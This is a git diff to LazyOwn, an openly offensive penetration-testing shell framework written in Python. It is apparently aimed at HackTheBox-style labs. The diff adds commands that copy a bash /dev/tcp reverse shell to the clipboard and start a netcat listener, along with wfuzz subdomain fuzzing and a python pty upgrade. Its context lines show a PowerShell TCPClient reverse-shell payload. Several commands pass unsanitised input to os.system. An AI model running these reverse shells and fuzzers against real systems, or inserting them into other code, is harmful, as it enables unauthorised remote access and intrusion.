@@ -29,6 +29,7 @@ import json
 from cmd import Cmd
 
 BANNER = """
+
  ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
 ▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
 ▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
@@ -48,7 +49,6 @@ BANNER = """
  ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
  ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
           ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
-                                                                              
 [*] Iniciando: Framework [;,;] """
 
 version = "v0.0.12"
@@ -77,7 +77,7 @@ BG_MAGENTA = "\033[45m"
 BG_CYAN = "\033[46m"
 BG_WHITE = "\033[47m"
 
-print(f"{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}")
+print(f"{BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}")
 
 def signal_handler(sig, frame):
     global should_exit
@@ -112,17 +112,18 @@ def activate_virtualenv(venv_path):
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
     intro = f"""{YELLOW}\n[*] Welcome to the LazyOwn Framework [;,;] {BLUE}{version} {WHITE}interactive shell! Type ? to list commands{BLUE}
-[+] Github: https://github.com/grisuno/LazyOwn
-[+] Web: https://grisuno.github.io/LazyOwn/
-[+] Reddit: https://www.reddit.com/r/LazyOwn/
-[+] Facebook: https://web.facebook.com/profile.php?id=61560596232150
-[+] hackTheBox: https://app.hackthebox.com/teams/overview/6429 {RESET}
+{GREEN}[+] Github:{BLUE} https://github.com/grisuno/LazyOwn
+{GREEN}[+] Web:{BLUE} https://grisuno.github.io/LazyOwn/
+{GREEN}[+] Reddit:{BLUE} https://www.reddit.com/r/LazyOwn/
+{GREEN}[+] Facebook:{BLUE} https://web.facebook.com/profile.php?id=61560596232150
+{GREEN}[+] hackTheBox:{BLUE} https://app.hackthebox.com/teams/overview/6429 {RESET}
 """
     # Diccionario para almacenar alias
     aliases = {
         'ls': 'list',  # Alias para el comando 'list'
         'nmap': 'run lazynmap',
         'q': 'exit',
+        'p':'payload',
     }
     os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
 
@@ -204,12 +205,14 @@ class LazyOwnShell(Cmd):
 
     def default(self, line):
         """Handle undefined commands (including aliases)."""
-        # Si el comando es un alias, reemplázalo con el comando correspondiente
-        if line in self.aliases:
-            line = self.aliases[line]
+        # Verificar si el comando es un alias
+        cmd = self.aliases.get(line, line)
         
-        if not self.onecmd(line):
-            print(f"{GREEN}[?] {YELLOW} full command {BLUE}{line}{RESET}")
+        # Ejecutar el comando si existe
+        if hasattr(self, f'do_{cmd}'):
+            return getattr(self, f'do_{cmd}')(None)
+        else:
+            print(f"{GREEN}[?] {YELLOW} Not Found {BLUE}{line}{RESET}")
 
     def one_cmd(self, command):
         self.output = self.get_output
@@ -908,6 +911,20 @@ class LazyOwnShell(Cmd):
         if not rhost or not dirwordlist:
             print("dirwordlist and rhost must be set")
             return
+        if line:
+            if line.startswith("sub"):
+                params = line.split(' ')
+                count = len(params)
+                arg1 = params[0]
+                domain = params[1]
+                if count > 2:
+                    arg3 = params[2]
+                else:
+                    arg3 = ""
+                print(f"[*] Try ...  wfuzz -c {arg3} -t 200 -w {dirwordlist} -H 'Host: FUZZ.{domain}' {domain}")
+                os.system(f"wfuzz -c {arg3} -t 200 -w {dirwordlist} -H 'Host: FUZZ.{domain}' {domain}")
+                return
+        print(f"[*]Try ... wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
         os.system(f"wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
         return
 
@@ -1246,11 +1263,57 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
         print(f"{BLUE}[*] ip from tun0 copied to clipboard :) {RESET}")
         return
+        
+    def do_rhost(self,line):
+        """Copy rhost to clipboard"""
+        rhost = self.params["rhost"]
+        if not rhost:
+            print(f"{RED}[?] {YELLOW} rhost must be set, use: {GREEN}payload {YELLOW}or {GREEN}set rhost 10.10.10.10{RESET}")
+            return
+        os.system(f"echo '{rhost}' | xclip -sel clip")
+        print(f"{BLUE}[*] ip from payload: {rhost=}, copied to clipboard :) {RESET}")
+        return
+
+    def do_banner(self,line):
+        """Show the banner"""
+        print(f"{BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}")
+        print(LazyOwnShell().intro)
+        return
 
     def do_py3ttyup(self,line):
         """copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah... """
         os.system("echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip")
         print("[+] Try... echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip # copied to clipboard :) ")
+        return
+    
+    def do_rev(self,line):
+        """Copy a revshell to clipboard"""
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        if not lhost or not lport:
+            print(f"{YELLOW} [?] lhost and lport must be set.{RESET}")
+            return
+        print(f"[+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+        os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
+        return
+    def do_nc(self,line):
+        """run nc -lvnp 6666 :) """
+        lport = self.params["lport"]
+        if not lport and not line:
+            print(f"{YELLOW} [?] lport must be set or pass the port by parameter like: nc 6666.{RESET}")
+            return
+        if not line:
+            print(f"{GREEN}[+] Try.. nc -lvnp {lport}{RESET}")
+            os.system(f"nc -lvnp {lport}")
+        else:
+            print(f"{GREEN}[+] Try.. nc -lvnp {line}{RESET}")
+            os.system(f"nc -lvnp {line}")
+        return
+
+    def do_vpn(self,line):
+        """Open vpn like htb vpn"""
+        print("[+] Try... sudo openvpn *.ovpn")
+        os.system("sudo openvpn *.ovpn")
         return
 
     def do_www(slf, line):
